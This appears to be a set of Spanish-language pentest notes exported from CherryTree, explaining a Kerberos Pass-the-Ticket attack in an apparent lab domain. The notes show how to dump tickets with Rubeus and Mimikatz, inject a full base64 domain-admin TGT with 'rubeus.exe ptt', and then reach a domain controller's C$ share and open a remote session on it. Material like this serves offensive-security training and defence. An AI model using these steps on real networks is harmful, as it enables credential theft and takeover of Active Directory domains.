<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PassTheTicket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PassTheTicket</h1><br/><p><strong><h1>PASSTHETICKET</h1></strong></p><p></p><p>ES OTRA TÉCNICA MUY UTILIZADA QUE COMPARTE CIERTOS FACTORES CON LAS ANTERIORES PERO TIENE ALGUNAS PARTICULARIDADES QUE LA PUEDEN HACER MÁS EFECTIVA EN CIERTOS MOMENTOS.</p><p></p><p></p><p>Otra de las cosas que se generan cuando un usuario se autentica es un TGT si se utiliza kerberos y además algún ticket de servicio.</p><p></p><p>Si en una powershell sin privilegios podemos ver los tickets de kerberos asignados al usuario</p><p></p><p><img src="images/39-1.png" alt="images/39-1.png" /></p><p></p><p>Tenemos un TGT del servidor krbtgt y un TGS para el servicio LDAP.</p><p></p><p>Con la misma técnica de volcado de TGT podemos volcar también la clave de sesión asociada.</p><p></p><p>Si iniciamos una powershell como administrador del dominio, este además de haber dejado sus credenciales en una sesión de logon también ha solicitado un TGT y un TGS. Por lo tanto en memoria se encuentran ambos.</p><p></p><p>Para poder volcar esta información tendremos que ser administradores locales del equipo.</p><p></p><p>Con rubeus en una powershell como administrador local:</p><p></p><p><div class="codebox"><pre><br />rubeus.exe dump</pre></div></p><p></p><p><img src="images/39-2.png" alt="images/39-2.png" /></p><p></p><p>Vuelca todos los tickets que se encuentren en el equipo entre los que se encuentra el del administrador del dominio.</p><p></p><p><img src="images/39-3.png" alt="images/39-3.png" /></p><p></p><p></p><p>Lo que vuelca aquí rubeus es el TGT más la clave de session con la que está cifrado en el conjunto.</p><p></p><p>Hay otro método con Mimikatz:</p><p></p><p><div class="codebox"><pre><br />sekurlsa<span style="color:#000000;font-weight:700">::</span>tickets</pre></div></p><p></p><p><img src="images/39-4.png" alt="images/39-4.png" /></p><p></p><p>Lo importante es que mimikatz separa la session key del ticket a diferencia de rubeus.</p><p></p><p></p><p></p><p></p><p>Ahora podemos re-inyectar ese ticket en otra logonsession de otro usuario administrador.</p><p>La diferencia de los anteriores métodos es que cuando hemos obtenido el ticket podemos movernos a otro terminal o usar un usuario sin privilegios, ni siquiera locales.</p><p></p><p></p><p>Rubeus permite importar TGT y sessionkey sin privilegios de administración.</p><p>Esto significa que podemos conseguir este TGT y la sessionkey de un equipo, llevarlo a otro completamente distinto y sin ningún privilegio e inyectarlo en la sesión de ese usuario para poder consumir servicios en nombre del administrador del dominio.</p><p></p><p>Para formatear el ticket tenemos que quitar los espacios y quitar los saltos de línea.</p><p></p><p>Con el ticket listo.</p><p></p><p><div class="codebox"><pre><br />rubeus.exe ptt <span style="color:#000000;font-weight:700">/</span>ticket<span style="color:#000000;font-weight:700">:</span>doIFyDCCBcSgAwIBBaEDAgEWooIEzjCCBMphggTGMIIEwqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggSKMIIEhqADAgESoQMCAQKiggR4BIIEdAj834JeavppTumcmbs3fg11wVcUCZrNsLmYtkhCm1iFVI7uMFXy1DOgAP1brwQvIuv<span style="color:#000000;font-weight:700">/</span>ADK7L3CjA159td6bCWu<span style="color:#000000;font-weight:700">+</span>rCv<span style="color:#000000;font-weight:700">/</span>BlyfHmH5HpvVpDTseAy2IR7<span style="color:#000000;font-weight:700">/</span>bzjzPBXomA9MlI4MyY9Xv88<span style="color:#000000;font-weight:700">+</span>jGc4wvoWMWILCvoLK<span style="color:#000000;font-weight:700">/</span>Pmjc<span style="color:#000000;font-weight:700">+</span>QxJHSMMzLhhyCGpJUL1Gozx53KPVbDfTELPjJ<span style="color:#000000;font-weight:700">+</span>NdrpTYxFOXLOrl845CpeRPyrx5VzgpP6rmGtpM74IIjh1AG381gjO98rB<span style="color:#000000;font-weight:700">/</span>0LeDfZubZ13l4VwuDYBU42wkRfRqu8RxsJ2gxz34h9<span style="color:#000000;font-weight:700">/</span>ZzFSLSEoimkDZ3WctbCAJBd<span style="color:#000000;font-weight:700">+/</span>O9mdZeLjcZAJlO03MD<span style="color:#000000;font-weight:700">/</span>t4voqG3goyznnuwERoTqUg<span style="color:#000000;font-weight:700">/</span>M<span style="color:#000000;font-weight:700">/</span>4AWt41KRx4N62pHwLIJywK43V9ZyJbF2yjkoECNGfiziiXLGCTt7R9xhIbomgzdhu4bi4q0yNmm6IoUbwn0h0UlJ69i<span style="color:#000000;font-weight:700">+</span>xIkx47O0anWb3oxX4BTmSxgUEB2fZDlwKiFFXIX68iad5<span style="color:#000000;font-weight:700">+</span>MHzmryqooHfSM5hJxVRX8daIyOOZME9qPXwP0eLhRNZd563y4Rog6K0apoOvsOp8GA8wVdaXVBYCE<span style="color:#000000;font-weight:700">+</span>v8n<span style="color:#000000;font-weight:700">/</span>vTui5h1GkHnyM0flCXRWdpXz2jCIT3rF63glKuqfBv<span style="color:#000000;font-weight:700">+</span>LCaMauxFJ9PWqPNC4YanWpx4eRaMAb4i6oC61H4g85GaPPywvUoAX4Y7mOd4Hk03NzjcsV5DmrskyskHme3MfF<span style="color:#000000;font-weight:700">+</span>cN7<span style="color:#000000;font-weight:700">/</span>3JvkuuOvmHrD<span style="color:#000000;font-weight:700">+</span>jTXX9I7m<span style="color:#000000;font-weight:700">+</span>U1aQrF9Ur<span style="color:#000000;font-weight:700">+</span>JzlwreQF2HffTQMsOEpJBYsmbz5Vh<span style="color:#000000;font-weight:700">+</span>9jM8wIgm0KwMJa5vUTZMWkkDLyOJ50p39TrAkQTGHOW8u86NaO6AkGiV5kullUmGi9Q7QMrION<span style="color:#000000;font-weight:700">/</span>a150UwVovoQiyWIQYcRBHUuDx0L9<span style="color:#000000;font-weight:700">/</span>LhXxW6dqsA6IWrz3fYCx9nhDzQ<span style="color:#000000;font-weight:700">+</span>oMqoyKkRcFRNdffcY5CSqRcaYeyUOxez1Kmlx0JCnyaWp0bie8h8Uw0aviIUioQDTF2uslKpBeTV0toMlZTKsOBnBEB5UV4UZSdMqg5Bmi7mCQh9<span style="color:#000000;font-weight:700">/</span>Vi<span style="color:#000000;font-weight:700">+</span>a<span style="color:#000000;font-weight:700">/</span>QNfTpzO6yDkARF<span style="color:#000000;font-weight:700">+</span>I8Jbk9ik48QEQnm65UPCnBPKrPZ6Z84kA2hDp<span style="color:#000000;font-weight:700">+</span>dnAqH7nU<span style="color:#000000;font-weight:700">+</span>5vS4tYiEBQrtaxIk0D<span style="color:#000000;font-weight:700">+</span>apw<span style="color:#000000;font-weight:700">/</span>di<span style="color:#000000;font-weight:700">+</span>TxuNNhsYHoF05n9S3RW7pMlgOVsW1jCBkYTsHML<span style="color:#000000;font-weight:700">/</span>Kuy<span style="color:#000000;font-weight:700">/</span>gsnm2vziBOsieGD1LvSWZ5k62gYOqsgQdpwGJDTdLDqXyMGg05llC26OueMUmS0yrqUUkTChdjy2b3GLD5RW<span style="color:#000000;font-weight:700">/</span>68ANzLqpIoebk7Gde3<span style="color:#000000;font-weight:700">+</span>q<span style="color:#000000;font-weight:700">/</span>PZIazg2e4JHIdSlREnRHEmTinMXWSJyqGIoOUaDqeo1ho<span style="color:#000000;font-weight:700">+</span>B2<span style="color:#000000;font-weight:700">/</span>0ZlSbCOcmzCae7akySpsEl9c<span style="color:#000000;font-weight:700">+</span>qZocqKN6jz3D3Z3yBpMGOBc4pxCapCD5tZWyxqHQ3LaimJX<span style="color:#000000;font-weight:700">+</span>pFyRigMgsHkdLG<span style="color:#000000;font-weight:700">+</span>J<span style="color:#000000;font-weight:700">+</span>HYjiRreKCt5qLQS61wBVQB55hQTYA<span style="color:#000000;font-weight:700">+</span>XPcCmoajpbjhs1P6J9Eu1ghE4inPX5ARiNaIXmnZkqjKLKwuR0d58SZncsfWeK4d79Mw3NeGc8znkO6OB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIGBFeU9pKSa<span style="color:#000000;font-weight:700">/</span>cB7H7J5<span style="color:#000000;font-weight:700">+</span>zVu5CSklcU6d52CXfomvbE78oQwbCkNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhZG9yowcDBQBA4QAApREYDzIwMjQwMzA0MjAzMDI2WqYRGA8yMDI0MDMwNTA2MzAyNlqnERgPMjAyNDAzMTEyMDMwMjZaqAwbCkNPUlAuTE9DQUypHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUw</pre></div></p><p></p><p><img src="images/39-5.png" alt="images/39-5.png" /></p><p></p><p></p><p>Si ahora listamos los tickets del logonsession:</p><p></p><p><img src="images/39-6.png" alt="images/39-6.png" /></p><p></p><p>Vemos como tenemos el TGT del usuario administrador.</p><p></p><p><div class="codebox"><pre><br /><span style="color:#729fcf;font-weight:400">dir</span> <span style="color:#000000;font-weight:700">\\</span>DC01<span style="color:#000000;font-weight:700">\</span>C$</pre></div></p><p></p><p>Ahora por lo tanto podemos hacer peticiones a los servicios haciéndonos pasar por el usuario administrador:</p><p></p><p><img src="images/39-7.png" alt="images/39-7.png" /></p><p></p><p>También si queremos por ejemplo una sesión remota de cualquier equipo:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#729fcf;font-weight:400">Enter-PSSession</span> <span style="color:#000000;font-weight:700">-</span>ComputerName DC01</pre></div></p><p></p><p><img src="images/39-8.png" alt="images/39-8.png" /></p><p></p><p></p><p></p><p>Lo mas importante es que una vez que consigues importar un ticket de servicio y su clave de sesión podemos importarlo en cualquier usuario sin ningún tipo de privilegio aunque es importante que deben ser el TGT y la SessionKey.</p><p></p><p></p></div>
</body>
</html>
